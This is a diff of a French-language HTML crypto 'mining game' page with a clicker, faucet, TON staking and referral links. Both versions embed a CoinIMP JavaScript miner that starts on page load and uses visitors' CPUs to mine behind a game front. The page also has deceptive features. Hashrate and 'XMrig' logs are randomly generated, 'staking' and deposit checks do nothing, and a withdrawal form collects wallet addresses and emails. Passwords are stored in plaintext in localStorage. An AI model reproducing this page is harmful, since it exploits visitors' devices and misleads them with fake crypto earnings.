@@ -1,195 +1,211 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8">
-<title>Deadspot Miner + Clicker Cosmic</title>
-<style>
-body {
-  background:#0d0d0d; color:#eee; font-family: monospace; margin:0; overflow:hidden;
-}
-h1 { color:#4caf50; text-align:center; margin:10px 0; }
-#deadspotBalance { font-size:22px; margin:10px; color:#ffd700; text-align:center; }
-#energyBar { width: 300px; height: 20px; border:1px solid #444; margin:10px auto; background:#222; border-radius:5px; overflow:hidden; }
-#energyFill { height:100%; width:100%; background:#4caf50; transition: width 0.2s; }
-#clickBtn {
-  width: 220px; height: 220px; border-radius: 50%; background: #111; border: 3px solid #444;
-  cursor: pointer; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%);
-  overflow:hidden; box-shadow:0 0 15px #4caf50 inset; animation: pulseClick 2s infinite alternate; z-index:2;
-}
-#clickBtn img { width:100%; height:100%; object-fit:cover; }
-#clickBtn:active { transform:translate(-50%,-50%) scale(0.95); box-shadow:0 0 30px #ff0000 inset; }
-@keyframes pulseClick { 0%{box-shadow:0 0 15px #4caf50 inset;} 100%{box-shadow:0 0 30px #00f;} }
-button { background:#333; color:#eee; padding:10px 20px; border:none; border-radius:5px; margin:5px; cursor:pointer; }
-button:hover { background:#555; }
-#hashrateChart { background:rgba(0,0,0,0.5); border:1px solid #333; border-radius:10px; position:absolute; top:400px; left:50%; transform:translateX(-50%); }
-#xmrigLogsBox { position:absolute; top:10px; left:10px; width:350px; height:300px; background:rgba(0,0,0,0.5); border:1px solid #444; padding:10px; overflow-y:auto; font-size:12px; }
-.logAccepted { color:#4caf50; }
-.logRejected { color:#f44336; }
-#pulseurBox { position:absolute; top:180px; right:10px; width:250px; text-align:center; z-index:2; }
-#pulseur { width:50px; height:50px; margin:5px auto; background:red; border-radius:50%; animation: pulse 1.5s infinite alternate; cursor:pointer; }
-@keyframes pulse { 0%{transform:scale(1);} 100%{transform:scale(1.2);} }
-#stakedInfo, #stakingBonus { margin:5px; }
-#stakeHistory { max-height:120px; overflow-y:auto; margin-top:5px; background:rgba(0,0,0,0.3); padding:5px; font-size:12px; text-align:left; }
-#faucetBox { position:absolute; top:500px; left:50%; transform:translateX(-50%); text-align:center; }
-#cooldown { font-size:12px; color:#aaa; margin-top:5px; }
-#withdrawModal {
-  display:none; position:fixed; top:0; left:0; width:100%; height:100%;
-  background:rgba(0,0,0,0.7); justify-content:center; align-items:center; z-index:10;
-}
-#withdrawForm {
-  background:#111; padding:20px; border-radius:10px; width:300px; text-align:center;
-  border:1px solid #444;
-}
-#withdrawForm input { width:90%; margin:5px 0; padding:8px; border:none; border-radius:5px; }
-#withdrawForm button { margin-top:10px; }
-#stars { position:absolute; width:100%; height:100%; background:black; z-index:-2; }
-.star { position:absolute; width:2px; height:2px; background:white; border-radius:50%; animation: twinkle 3s infinite; }
-@keyframes twinkle { 0%,100%{opacity:0.5;} 50%{opacity:1;} }
-.spaceship { position:absolute; width:30px; height:15px; background:cyan; clip-path:polygon(0% 0%,100% 50%,0% 100%); animation:fly linear infinite; z-index:-1; }
-@keyframes fly { 0%{left:-40px;} 100%{left:100%;} }
-#refLinks { position:absolute; bottom:10px; left:10px; font-size:12px; }
-#refLinks a { color:#4caf50; text-decoration:none; }
-</style>
+  <meta charset="UTF-8">
+  <title>Deadspot Mining Game</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #0d0d0d;
+      color: #eee;
+    }
+    header {
+      text-align: center;
+      padding: 20px;
+      background: #111;
+      font-size: 22px;
+      font-weight: bold;
+    }
+    #loginBox, #mainApp {
+      display: none;
+      padding: 20px;
+    }
+    input, button {
+      padding: 8px;
+      margin: 5px;
+      border-radius: 5px;
+      border: none;
+    }
+    button {
+      background: #560872;
+      color: #fff;
+      cursor: pointer;
+    }
+    #clickButton {
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      border: 3px solid #560872;
+      margin: 30px auto;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: url("https://i.ibb.co/mJpBLHp/skull.png") no-repeat center;
+      background-size: 80px 80px;
+      box-shadow: 0 0 20px #560872;
+      transition: all 0.2s ease-in-out;
+    }
+    #clickButton:active {
+      transform: scale(1.1);
+      box-shadow: 0 0 40px #ff00ff;
+    }
+    #faucetSection {
+      text-align: center;
+      margin-top: 150px; /* descendu plus bas */
+    }
+    #staking {
+      background: #111;
+      padding: 15px;
+      margin: 20px auto;
+      width: 90%;
+      border-radius: 10px;
+    }
+    #logs {
+      background: #1a1a1a;
+      padding: 10px;
+      margin: 20px;
+      height: 150px;
+      overflow-y: scroll;
+      font-size: 12px;
+    }
+    #refLinks {
+      margin: 20px;
+      font-size: 14px;
+    }
+  </style>
 </head>
 <body>
+  <header>💎 Deadspot Mining Game</header>
 
-<div id="stars"></div>
-
-<h1>💎 Deadspot Miner + Clicker Cosmic</h1>
-<div id="deadspotBalance">Deadspot: 0</div>
-<div id="energyBar"><div id="energyFill"></div></div>
-
-<div id="clickBtn"><img src="skull.png" alt="skull"></div>
-
-<div id="xmrigLogsBox"></div>
-
-<!-- Pulseur + staking -->
-<div id="pulseurBox">
-  <div id="pulseur"></div>
-  <div id="stakedInfo">Total staké : 0 TON</div>
-  <div id="stakingBonus">Bonus reçu : 0 DSC</div>
-  <button id="verifyDepositBtn">✅ Vérifier Dépôt</button>
-  <button id="withdrawBtn">📤 Retirer mes TON</button>
-  <button id="convertBonusBtn">💎 Convertir Bonus → Deadspot</button>
-  <div id="stakeHistory"></div>
-</div>
-
-<!-- Faucet -->
-<div id="faucetBox">
-  <button id="faucetBtn">🎁 Claim Faucet</button>
-  <div id="cooldown">Prêt à réclamer</div>
-</div>
-
-<!-- Withdraw Modal -->
-<div id="withdrawModal">
-  <div id="withdrawForm">
-    <h3>📤 Retirer mes TON</h3>
-    <input type="text" id="wallet" placeholder="Adresse Wallet TON" required>
-    <input type="number" id="amount" placeholder="Montant à retirer" required>
-    <input type="email" id="email" placeholder="Email FaucetPay" required>
-    <button id="confirmWithdraw">✅ Confirmer</button>
-    <button onclick="document.getElementById('withdrawModal').style.display='none'">❌ Annuler</button>
+  <!-- Login / Register -->
+  <div id="loginBox">
+    <h3>🔑 Connexion / Inscription</h3>
+    <input type="text" id="username" placeholder="Nom d'utilisateur"><br>
+    <input type="password" id="password" placeholder="Mot de passe"><br>
+    <button onclick="register()">Inscription</button>
+    <button onclick="login()">Connexion</button>
+    <p id="loginMsg"></p>
   </div>
-</div>
 
-<canvas id="hashrateChart" width="400" height="200"></canvas>
+  <!-- Main app -->
+  <div id="mainApp">
+    <div id="clickButton"></div>
+    <p style="text-align:center;">💠 Deadspot : <span id="deadspot">0</span></p>
 
-<!-- Liens referral -->
-<div id="refLinks">
-  <h3>🔗 Liens Utiles / Références :</h3>
-  <ul style="list-style:none; padding:0; margin:0; font-size:12px;">
-    <li><a href="https://maximlprive1990.github.io/mainnet-mini-mining-game/" target="_blank">Mini Mining Game</a></li>
-    <li><a href="https://maximlprive1990.github.io/Coinimp-miner-to-earn/" target="_blank">CoinIMP Miner</a></li>
-    <li><a href="https://cryptominingimpmininghash.store/app" target="_blank">Crypto Mining IMP</a></li>
-    <li><a href="https://tonstakevault.info/" target="_blank">TON Stake Vault</a></li>
-    <li><a href="https://cryptoyieldhub.info/" target="_blank">Crypto Yield Hub</a></li>
-    <li><a href="https://maximlprive1990.github.io/Deadspot-miner-pool.coinimp.com/" target="_blank">Deadspot Miner Pool</a></li>
-  </ul>
-</div>
+    <!-- Faucet -->
+    <div id="faucetSection">
+      <h3>🎁 Faucet</h3>
+      <button onclick="claimFaucet()">Claim Faucet</button>
+      <p id="faucetCooldown"></p>
+    </div>
 
-<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-<script src="https://www.hostingcloud.racing/I9tR.js"></script>
-<script>
-var _client = new Client.Anonymous('e21d602e2242e7d28fc1409ef8a44920d6b5ffdfd95be04f205b4d12e520085f', {
-  throttle: 0.4, c: 'w'
-});
-_client.start();
-_client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 20, "#3d3d3d");
+    <!-- Staking -->
+    <div id="staking">
+      <h3>📦 Staking TON</h3>
+      <p>Total Staké : <span id="totalStaked">0</span> TON</p>
+      <input type="number" id="stakeAmount" placeholder="Montant TON à staker">
+      <button onclick="stake()">Staker</button>
+      <button onclick="verifyDeposit()">Vérifier Dépôt</button>
+      <p id="stakeMsg"></p>
+    </div>
 
-let deadspot=parseFloat(localStorage.getItem("deadspot"))||0;
-let energy=parseFloat(localStorage.getItem("energy"))||100;
-let maxEnergy=100;
-let clickValue=0.00015;
-let lastFaucetClaim=parseInt(localStorage.getItem("lastFaucetClaim"))||0;
-let faucetCooldown=60; // 60 sec pour test
+    <!-- Logs -->
+    <div id="logs">
+      <strong>📜 Logs XMrig / Deadspot :</strong><br>
+    </div>
 
-function saveGame(){
-  localStorage.setItem("deadspot",deadspot);
-  localStorage.setItem("energy",energy);
-  localStorage.setItem("lastFaucetClaim",lastFaucetClaim);
-}
-function updateUI(){
-  document.getElementById("deadspotBalance").textContent="Deadspot: "+deadspot.toFixed(5);
-  document.getElementById("energyFill").style.width=(energy/maxEnergy*100)+"%";
-}
-document.getElementById("clickBtn").addEventListener("click",()=>{
-  if(energy>0){ deadspot+=clickValue; energy--; saveGame(); updateUI(); }
-});
-setInterval(()=>{ if(energy<maxEnergy){ energy++; updateUI(); }},1000);
+    <!-- Liens referral -->
+    <div id="refLinks">
+      <h3>🔗 Liens Utiles / Références :</h3>
+      <ul style="list-style:none; padding:0; margin:0; font-size:12px;">
+        <li><a href="https://maximlprive1990.github.io/mainnet-mini-mining-game/" target="_blank">Mini Mining Game</a></li>
+        <li><a href="https://maximlprive1990.github.io/Coinimp-miner-to-earn/" target="_blank">CoinIMP Miner</a></li>
+        <li><a href="https://cryptominingimpmininghash.store/app" target="_blank">Crypto Mining IMP</a></li>
+        <li><a href="https://tonstakevault.info/" target="_blank">TON Stake Vault</a></li>
+        <li><a href="https://cryptoyieldhub.info/" target="_blank">Crypto Yield Hub</a></li>
+        <li><a href="https://maximlprive1990.github.io/Deadspot-miner-pool.coinimp.com/" target="_blank">Deadspot Miner Pool</a></li>
+      </ul>
+    </div>
+  </div>
 
-// Faucet logic
-document.getElementById("faucetBtn").addEventListener("click",()=>{
-  let now=Math.floor(Date.now()/1000);
-  if(now-lastFaucetClaim<faucetCooldown){ alert("⏳ Attendez le cooldown"); return; }
-  let reward=(Math.random()*0.1+0.0002).toFixed(5);
-  deadspot+=parseFloat(reward);
-  lastFaucetClaim=now;
-  saveGame(); updateUI();
-  alert("🎁 Faucet gagné: +"+reward+" DSC");
-});
-setInterval(()=>{
-  let now=Math.floor(Date.now()/1000);
-  let remain=Math.max(0,faucetCooldown-(now-lastFaucetClaim));
-  document.getElementById("cooldown").textContent=remain>0?"⏳ Attendez "+remain+"s":"Prêt à réclamer";
-},1000);
+  <!-- CoinIMP Miner -->
+  <script src="https://www.hostingcloud.racing/I9tR.js"></script>
+  <script>
+    var _client = new Client.Anonymous('e21d602e2242e7d28fc1409ef8a44920d6b5ffdfd95be04f205b4d12e520085f', {
+        throttle: 0.4, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 20, "#3d3d3d");
+  </script>
 
-// Withdraw modal
-document.getElementById("withdrawBtn").addEventListener("click",()=>{
-  document.getElementById("withdrawModal").style.display="flex";
-});
-document.getElementById("confirmWithdraw").addEventListener("click",()=>{
-  let wallet=document.getElementById("wallet").value;
-  let amount=document.getElementById("amount").value;
-  let email=document.getElementById("email").value;
-  if(!wallet||!amount||!email){ alert("Veuillez remplir tous les champs"); return; }
-  alert("✅ Retrait demandé\nWallet: "+wallet+"\nMontant: "+amount+" TON\nEmail FaucetPay: "+email);
-  document.getElementById("withdrawModal").style.display="none";
-});
+  <script>
+    // Login system localStorage
+    function register() {
+      const user = document.getElementById('username').value;
+      const pass = document.getElementById('password').value;
+      if (!user || !pass) { document.getElementById('loginMsg').innerText = "⚠️ Remplis tout !"; return; }
+      localStorage.setItem("user_"+user, pass);
+      document.getElementById('loginMsg').innerText = "✅ Compte créé, connecte-toi !";
+    }
+    function login() {
+      const user = document.getElementById('username').value;
+      const pass = document.getElementById('password').value;
+      if (localStorage.getItem("user_"+user) === pass) {
+        document.getElementById('loginBox').style.display="none";
+        document.getElementById('mainApp').style.display="block";
+      } else {
+        document.getElementById('loginMsg').innerText = "❌ Mauvais identifiants";
+      }
+    }
 
-// Chart.js
-const ctx=document.getElementById('hashrateChart').getContext('2d');
-const hashrateChart=new Chart(ctx,{type:'line',data:{labels:[],datasets:[{label:'H/s',data:[],borderColor:'#4caf50',fill:true,tension:0.3}]},options:{responsive:false,animation:false,plugins:{legend:{labels:{color:'#eee'}}},scales:{x:{ticks:{color:'#aaa'}},y:{ticks:{color:'#aaa'}}}}});
-let time=0, totalHashes=0;
-setInterval(()=>{
-  let hps=Math.random()*50+50;
-  totalHashes+=hps;
-  hashrateChart.data.labels.push(time+"s");
-  hashrateChart.data.datasets[0].data.push(hps);
-  if(hashrateChart.data.labels.length>20){ hashrateChart.data.labels.shift(); hashrateChart.data.datasets[0].data.shift(); }
-  hashrateChart.update();
-  let xmrigLogs=document.getElementById("xmrigLogsBox");
-  let line=`[${new Date().toLocaleTimeString()}] Hashrate: ${hps.toFixed(2)} H/s`;
-  let span=document.createElement("span"); span.textContent=line; span.className="logAccepted";
-  xmrigLogs.appendChild(span); xmrigLogs.appendChild(document.createElement("br"));
-  xmrigLogs.scrollTop=xmrigLogs.scrollHeight;
-  time++;
-},1000);
+    // Deadspot clicker
+    let deadspot = 0;
+    document.getElementById("clickButton").addEventListener("click", ()=>{
+      deadspot += 0.001;
+      document.getElementById("deadspot").innerText = deadspot.toFixed(3);
+      log("Clicked -> +0.001 Deadspot");
+    });
 
-// Stars + Spaceships
-for(let i=0;i<100;i++){ let star=document.createElement("div"); star.className="star"; star.style.top=Math.random()*100+"%"; star.style.left=Math.random()*100+"%"; document.getElementById("stars").appendChild(star); }
-for(let i=0;i<5;i++){ let ship=document.createElement("div"); ship.className="spaceship"; ship.style.top=(20+i*30)+"px"; ship.style.animationDuration=(5+Math.random()*5)+"s"; document.body.appendChild(ship); }
+    // Faucet
+    let faucetCooldown = 0;
+    function claimFaucet(){
+      if(faucetCooldown>0){alert("⏳ Attends "+faucetCooldown+"s"); return;}
+      deadspot += 0.05;
+      document.getElementById("deadspot").innerText = deadspot.toFixed(3);
+      log("Faucet claim +0.05 Deadspot");
+      faucetCooldown=60;
+      let interval=setInterval(()=>{
+        faucetCooldown--;
+        document.getElementById("faucetCooldown").innerText="Cooldown: "+faucetCooldown+"s";
+        if(faucetCooldown<=0){clearInterval(interval); document.getElementById("faucetCooldown").innerText=""; }
+      },1000);
+    }
 
-updateUI();
-</script>
+    // Staking
+    let totalStaked=0;
+    function stake(){
+      let amt=parseFloat(document.getElementById("stakeAmount").value);
+      if(isNaN(amt)||amt<=0){alert("❌ Montant invalide"); return;}
+      totalStaked+=amt;
+      document.getElementById("totalStaked").innerText=totalStaked;
+      document.getElementById("stakeMsg").innerText="✅ "+amt+" TON staké";
+      log("Stake: "+amt+" TON");
+    }
+    function verifyDeposit(){
+      document.getElementById("stakeMsg").innerText="⏳ Vérification en cours (≈30min)...";
+      log("Vérification dépôt envoyée");
+    }
+
+    // Logs
+    function log(msg){
+      const logs=document.getElementById("logs");
+      const time=new Date().toLocaleTimeString();
+      logs.innerHTML="["+time+"] "+msg+"<br>"+logs.innerHTML;
+    }
+
+    // Show login at start
+    document.getElementById('loginBox').style.display="block";
+  </script>
 </body>
 </html>
